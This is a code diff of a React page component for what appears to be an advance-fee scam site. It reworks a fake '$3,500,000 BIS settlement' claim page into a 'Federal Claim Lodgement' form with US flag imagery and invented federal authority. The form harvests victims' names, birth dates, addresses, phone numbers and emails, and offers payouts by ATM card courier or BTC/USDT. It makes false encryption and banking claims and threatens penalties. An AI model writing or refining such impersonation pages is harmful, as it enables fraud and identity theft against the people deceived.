@@ -1,14 +1,13 @@
-
 import React, { useState } from 'react';
 import { motion } from 'framer-motion';
 import { 
   User, Globe, Mail, Landmark, AlertCircle, Calendar, 
   MapPin, Phone, CreditCard, ShieldCheck, Loader2, 
-  FileText, Lock, FileBadge
+  FileText, Lock, FileBadge, Scale, ShieldAlert, Building2
 } from 'lucide-react';
-import GlassCard from '../components/GlassCard';
-import MotionButton from '../components/MotionButton';
-import { VerificationFormData } from '../types';
+import GlassCard from '../components/GlassCard.tsx';
+import MotionButton from '../components/MotionButton.tsx';
+import { VerificationFormData } from '../types.ts';
 
 interface VerifyProps {
   onSuccess: (data: VerificationFormData) => void;
@@ -32,215 +31,215 @@ const Verify: React.FC<VerifyProps> = ({ onSuccess }) => {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    // Simulate official processing delay
     setTimeout(() => {
       setIsLoading(false);
       onSuccess(formData);
-    }, 2000);
+    }, 2500);
   };
 
-  const labelClass = "text-xs font-bold text-slate-500 mb-1.5 uppercase tracking-wider block";
-  const inputClass = "w-full pl-10 pr-4 py-3 rounded-xl border border-slate-200 focus:border-blue-600 focus:ring-4 focus:ring-blue-100 transition-colors outline-none bg-white/70 text-slate-900 font-medium placeholder:text-slate-400";
-  const focusAnimation = { scale: 1.01, transition: { type: "spring", stiffness: 300, damping: 20 } };
+  const labelClass = "text-[10px] font-black text-slate-900 mb-1.5 uppercase tracking-widest block";
+  const inputClass = "w-full pl-10 pr-4 py-4 rounded-none border-2 border-slate-200 focus:border-[#002868] transition-all outline-none bg-white text-slate-900 font-bold placeholder:text-slate-300 uppercase text-xs";
 
   return (
-    <div className="pt-32 pb-24 max-w-5xl mx-auto px-4">
-      <div className="text-center mb-10">
-        <h2 className="text-3xl font-bold text-slate-900 mb-2">Beneficiary Re-Confirmation</h2>
-        <p className="text-slate-500">Crediting Allotted Amount to File: <span className="font-bold text-blue-600">BIS/CPM/025</span></p>
+    <div className="pt-32 pb-24 max-w-6xl mx-auto px-4">
+      <div className="flex flex-col md:flex-row items-center gap-6 mb-12 border-b-4 border-slate-900 pb-8">
+        <div className="p-4 bg-[#002868] text-white">
+          <Landmark className="w-10 h-10" />
+        </div>
+        <div className="text-left flex-grow">
+          <h2 className="text-4xl font-black text-slate-900 tracking-tighter uppercase leading-none">Federal Claim Lodgement</h2>
+          <p className="text-[#BF0A30] font-black text-xs uppercase tracking-widest mt-2">Active File: BIS/CPM/025 • United States Settlement Initiative 2025</p>
+        </div>
+        <img 
+          src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" 
+          className="h-8 shadow-sm hidden md:block" 
+          alt="USA Flag" 
+        />
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
+      <div className="grid grid-cols-1 lg:grid-cols-12 gap-12">
         {/* Left Side: Form */}
-        <div className="lg:col-span-7">
-          <GlassCard>
-            <form onSubmit={handleSubmit} className="space-y-6">
-              <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 flex gap-3 items-start">
-                <AlertCircle className="w-5 h-5 text-blue-600 shrink-0 mt-0.5" />
-                <p className="text-xs text-blue-800 font-medium leading-relaxed">
-                  Kindly re-confirm your personal information accurately. This data will be cross-referenced with the 
-                  <span className="font-bold"> BIS Global Settlement Database</span> to authorize your $3.5M disbursement.
+        <div className="lg:col-span-8">
+          <form onSubmit={handleSubmit} className="space-y-8 bg-white p-8 md:p-12 shadow-2xl border border-slate-100">
+            <div className="bg-[#BF0A30]/5 border-l-4 border-[#BF0A30] p-6 flex gap-4 items-start">
+              <ShieldAlert className="w-6 h-6 text-[#BF0A30] shrink-0" />
+              <div>
+                <h4 className="text-sm font-black text-slate-900 uppercase tracking-tighter mb-1">Official Declaration</h4>
+                <p className="text-[11px] text-slate-600 font-bold uppercase leading-relaxed">
+                  By submitting this form, I certify that all information provided is accurate and my claim for the 
+                  <span className="text-[#BF0A30] ml-1">$3,500,000.00</span> settlement is valid under BIS regulations.
                 </p>
               </div>
+            </div>
 
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div className="relative md:col-span-2">
-                  <label className={labelClass}>Full Names</label>
-                  <User className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="text" 
-                    placeholder="Enter your legal full name"
-                    className={inputClass} 
-                    value={formData.fullName} 
-                    onChange={e => setFormData({...formData, fullName: e.target.value})} 
-                  />
-                </div>
-                <div className="relative">
-                  <label className={labelClass}>Date of Birth</label>
-                  <Calendar className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="text" 
-                    placeholder="DD/MM/YYYY" 
-                    className={inputClass} 
-                    value={formData.dob} 
-                    onChange={e => setFormData({...formData, dob: e.target.value})} 
-                  />
-                </div>
-                <div className="relative">
-                  <label className={labelClass}>Nationality</label>
-                  <Globe className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="text" 
-                    placeholder="Country of Citizenship"
-                    className={inputClass} 
-                    value={formData.nationality} 
-                    onChange={e => setFormData({...formData, nationality: e.target.value})} 
-                  />
-                </div>
-                <div className="relative md:col-span-2">
-                  <label className={labelClass}>Physical Address</label>
-                  <MapPin className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="text" 
-                    placeholder="Full residential address"
-                    className={inputClass} 
-                    value={formData.address} 
-                    onChange={e => setFormData({...formData, address: e.target.value})} 
-                  />
-                </div>
-                <div className="relative">
-                  <label className={labelClass}>Telephone</label>
-                  <Phone className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="tel" 
-                    placeholder="+1 (555) 000-0000"
-                    className={inputClass} 
-                    value={formData.phone} 
-                    onChange={e => setFormData({...formData, phone: e.target.value})} 
-                  />
-                </div>
-                <div className="relative">
-                  <label className={labelClass}>Email Address</label>
-                  <Mail className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.input 
-                    whileFocus={focusAnimation} 
-                    required 
-                    type="email" 
-                    placeholder="name@example.com"
-                    className={inputClass} 
-                    value={formData.email} 
-                    onChange={e => setFormData({...formData, email: e.target.value})} 
-                  />
-                </div>
-                <div className="relative md:col-span-2">
-                  <label className={labelClass}>Payment Method Preference</label>
-                  <CreditCard className="absolute left-3 bottom-3.5 z-10 w-5 h-5 text-slate-400" />
-                  <motion.select 
-                    whileFocus={focusAnimation} 
-                    className={`${inputClass} appearance-none cursor-pointer`} 
-                    value={formData.paymentMethod} 
-                    onChange={e => setFormData({...formData, paymentMethod: e.target.value})}
-                  >
-                    <option>Bank Direct Wire Transfer</option>
-                    <option>ATM Card (Priority Courier Delivery)</option>
-                    <option>Digital Asset Settlement (USDT/BTC)</option>
-                    <option>Certified Check Payment (Express Mail)</option>
-                  </motion.select>
-                </div>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div className="relative md:col-span-2">
+                <label className={labelClass}>Full Legal Name (as per ID)</label>
+                <User className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="text" 
+                  placeholder="John Fitzgerald Doe"
+                  className={inputClass} 
+                  value={formData.fullName} 
+                  onChange={e => setFormData({...formData, fullName: e.target.value})} 
+                />
               </div>
-
-              <div className="pt-4">
-                <MotionButton 
-                  type="submit" 
-                  variant="primary" 
-                  className="w-full py-4 text-lg bg-blue-700 hover:bg-blue-800 disabled:bg-slate-300" 
-                  disabled={isLoading}
+              <div className="relative">
+                <label className={labelClass}>Date of Birth</label>
+                <Calendar className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="text" 
+                  placeholder="MM/DD/YYYY" 
+                  className={inputClass} 
+                  value={formData.dob} 
+                  onChange={e => setFormData({...formData, dob: e.target.value})} 
+                />
+              </div>
+              <div className="relative">
+                <label className={labelClass}>Nationality</label>
+                <Globe className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="text" 
+                  placeholder="United States / Canada"
+                  className={inputClass} 
+                  value={formData.nationality} 
+                  onChange={e => setFormData({...formData, nationality: e.target.value})} 
+                />
+              </div>
+              <div className="relative md:col-span-2">
+                <label className={labelClass}>Residential Address</label>
+                <MapPin className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="text" 
+                  placeholder="Street, City, State, ZIP"
+                  className={inputClass} 
+                  value={formData.address} 
+                  onChange={e => setFormData({...formData, address: e.target.value})} 
+                />
+              </div>
+              <div className="relative">
+                <label className={labelClass}>Contact Telephone</label>
+                <Phone className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="tel" 
+                  placeholder="+1 (000) 000-0000"
+                  className={inputClass} 
+                  value={formData.phone} 
+                  onChange={e => setFormData({...formData, phone: e.target.value})} 
+                />
+              </div>
+              <div className="relative">
+                <label className={labelClass}>Official Email</label>
+                <Mail className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <input 
+                  required 
+                  type="email" 
+                  placeholder="email@example.gov"
+                  className={inputClass} 
+                  value={formData.email} 
+                  onChange={e => setFormData({...formData, email: e.target.value})} 
+                />
+              </div>
+              <div className="relative md:col-span-2">
+                <label className={labelClass}>Preferred Settlement Channel</label>
+                <CreditCard className="absolute left-3 bottom-4 z-10 w-5 h-5 text-slate-400" />
+                <select 
+                  className={`${inputClass} appearance-none cursor-pointer`} 
+                  value={formData.paymentMethod} 
+                  onChange={e => setFormData({...formData, paymentMethod: e.target.value})}
                 >
-                  {isLoading ? (
-                    <div className="flex items-center gap-3">
-                      <Loader2 className="w-6 h-6 animate-spin" />
-                      <span>Processing Lodgement...</span>
-                    </div>
-                  ) : (
-                    <div className="flex items-center gap-3">
-                      <FileBadge className="w-5 h-5" />
-                      <span>Submit Settlement Claim</span>
-                    </div>
-                  )}
-                </MotionButton>
+                  <option>Bank Direct Wire Transfer</option>
+                  <option>Certified Treasury Check (USPS Priority)</option>
+                  <option>ATM Card (Courier Dispatch)</option>
+                  <option>Digital Settlement Node (BTC/USDT)</option>
+                </select>
               </div>
-            </form>
-          </GlassCard>
+            </div>
+
+            <div className="pt-6">
+              <MotionButton 
+                type="submit" 
+                variant="primary" 
+                className="w-full py-5 text-sm font-black uppercase tracking-[0.3em] bg-[#002868] hover:bg-[#BF0A30] rounded-none disabled:bg-slate-300" 
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <div className="flex items-center gap-3">
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    <span>Transmitting Data...</span>
+                  </div>
+                ) : (
+                  <div className="flex items-center gap-3">
+                    <FileBadge className="w-5 h-5" />
+                    <span>Authorize Federal Lodgement</span>
+                  </div>
+                )}
+              </MotionButton>
+            </div>
+            
+            <p className="text-[9px] text-slate-400 text-center font-bold uppercase tracking-widest">
+              Submission IP recorded for security audit. Unauthorized claims are punishable under BIS 2025 Directive.
+            </p>
+          </form>
         </div>
 
-        {/* Right Side: Information & Compliance */}
-        <div className="lg:col-span-5 space-y-6">
-          <GlassCard className="bg-slate-900 border-slate-800 text-white">
-            <h3 className="text-xl font-bold mb-6 flex items-center gap-3">
-              <ShieldCheck className="w-6 h-6 text-blue-400" /> Security Protocol
-            </h3>
-            <div className="space-y-6">
+        {/* Right Side: Compliance & Authority */}
+        <div className="lg:col-span-4 space-y-6">
+          <div className="bg-slate-950 p-8 text-white">
+            <div className="flex items-center gap-4 mb-8">
+              <ShieldCheck className="w-8 h-8 text-[#BF0A30]" />
+              <h3 className="text-xl font-black uppercase tracking-tighter">Security Protocol</h3>
+            </div>
+            <div className="space-y-8">
               <div className="flex gap-4">
-                <div className="w-10 h-10 bg-blue-600/20 rounded-lg flex items-center justify-center shrink-0">
-                  <Lock className="w-5 h-5 text-blue-400" />
+                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
+                  <Lock className="w-5 h-5 text-[#BF0A30]" />
                 </div>
                 <div>
-                  <h4 className="text-sm font-bold text-slate-200 mb-1">End-to-End Encryption</h4>
-                  <p className="text-xs text-slate-400 leading-relaxed">
-                    Your data is secured using institutional-grade AES-256 encryption before transmission to the CPMI committee.
-                  </p>
+                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Encryption Mode</h4>
+                  <p className="text-xs font-bold leading-relaxed">AES-256 Multi-Layer Federal Standards.</p>
                 </div>
               </div>
               <div className="flex gap-4">
-                <div className="w-10 h-10 bg-green-600/20 rounded-lg flex items-center justify-center shrink-0">
-                  <FileText className="w-5 h-5 text-green-400" />
+                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
+                  <Scale className="w-5 h-5 text-[#BF0A30]" />
                 </div>
                 <div>
-                  <h4 className="text-sm font-bold text-slate-200 mb-1">Compliance Check</h4>
-                  <p className="text-xs text-slate-400 leading-relaxed">
-                    Submission of this form triggers an automatic verification against File BIS/CPM/025 records.
-                  </p>
+                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Compliance Check</h4>
+                  <p className="text-xs font-bold leading-relaxed">Automated Cross-Reference with Global BIS Asset Files.</p>
                 </div>
               </div>
               <div className="flex gap-4">
-                <div className="w-10 h-10 bg-yellow-600/20 rounded-lg flex items-center justify-center shrink-0">
-                  <Landmark className="w-5 h-5 text-yellow-400" />
+                <div className="w-10 h-10 bg-white/10 flex items-center justify-center shrink-0">
+                  <Building2 className="w-5 h-5 text-[#BF0A30]" />
                 </div>
                 <div>
-                  <h4 className="text-sm font-bold text-slate-200 mb-1">Bank Assignment</h4>
-                  <p className="text-xs text-slate-400 leading-relaxed">
-                    Upon successful lodgement, an accredited bank will be assigned to handle the $3,500,000.00 disbursement.
-                  </p>
+                  <h4 className="text-[10px] font-black uppercase tracking-widest text-white/50 mb-1">Bank Assignment</h4>
+                  <p className="text-xs font-bold leading-relaxed">Top-tier Accredited Federal Reserve Correspondent Banks.</p>
                 </div>
               </div>
             </div>
 
-            <div className="mt-8 p-4 bg-white/5 rounded-xl border border-white/10">
-              <p className="text-[10px] text-slate-400 italic text-center">
-                Official BIS-UNCC Regulatory Notice: Claims are processed in order of receipt. 
-                Ensure all fields match your legal documentation to avoid delays.
+            <div className="mt-12 p-6 border-2 border-white/10 text-center">
+              <p className="text-[10px] text-blue-300 font-black uppercase tracking-widest leading-relaxed">
+                Notice: All verified claims are indivisible and final.
               </p>
             </div>
-          </GlassCard>
+          </div>
 
-          <div className="rounded-2xl overflow-hidden shadow-lg border-4 border-white">
+          <div className="border-4 border-slate-200 p-2">
             <img 
-              src="https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&q=80&w=800" 
-              alt="Financial District" 
-              className="w-full h-48 object-cover grayscale opacity-80"
+              src="https://images.unsplash.com/photo-1570126688035-1e6adbd61053?auto=format&fit=crop&q=80&w=800" 
+              alt="Lincoln Memorial" 
+              className="w-full h-56 object-cover grayscale"
             />
-            <div className="bg-white p-4 text-center">
-              <span className="text-[10px] font-bold text-blue-700 uppercase tracking-widest">Global Settlement Initiative 2025</span>
+            <div className="bg-slate-50 p-4 text-center border-t-2 border-slate-200">
+              <span className="text-[10px] font-black text-slate-900 uppercase tracking-widest">Office of Asset Recovery</span>
             </div>
           </div>
         </div>
